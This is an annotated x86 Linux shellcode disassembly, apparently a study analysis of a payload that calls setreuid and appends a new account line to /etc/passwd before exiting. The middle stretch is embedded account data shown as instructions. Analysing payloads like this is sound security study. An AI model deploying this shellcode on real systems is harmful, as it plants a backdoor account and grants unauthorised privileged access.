xor    ecx,ecx     	; Making ecx to zero
mov    ebx,ecx     	; Moving Zero from ecx to ebx which makes ebx zero
push   0x46        	; Pushing 0x46 (Decimal value is 70 ) onto the stack
pop    eax         	; Popping top of stack value into eax. ie: Copying 0x46 => 70 Syscall into eax. Syscall for                   value 70 is setreuid
int    0x80        	; Interrupt
push   0x5         	; Pushing value 5 onto the stack
pop    eax        	; Pushing 5 into eax, syscall for number 5 is open
xor    ecx,ecx    	; Making ecx zero
push   ecx        	; Pushing zero onto stack
push   0x64777373 	; dwss
push   0x61702f2f 	; ap//
push   0x6374652f 	; cte/
mov    ebx,esp    	; Pointing ebx to top of the stack
inc    ecx        	; incrementing ecx by 1
mov    ch,0x4     	; Pushing value 4 into ch(Higher level of ecx)
int    0x80       	; Interrupt
xchg   ebx,eax
call   0x40208d <code+77>
jae    0x4020d9
popa   
cmp    al,BYTE PTR gs:[ecx+0x7a]
dec    eax
xor    al,0x33
jns    0x4020e7
pop    eax
das    
jp     0x4020e0
jo     0x4020e0
cmp    dh,BYTE PTR [eax]
cmp    dh,BYTE PTR [eax]
cmp    bh,BYTE PTR [edx]
das    
cmp    ch,BYTE PTR [edi]
bound  ebp,QWORD PTR [ecx+0x6e]
das    
jae    0x4020f4
or     bl,BYTE PTR [ecx-0x75]
push   ecx
cld    
push   0x4
pop    eax
int    0x80
push   0x1    		; Pushing value 1 onto stack
pop    eax    		; Moving value 1 on top of stack into eax (syscall for 1 is exit)
int    0x80   		; Interrupt
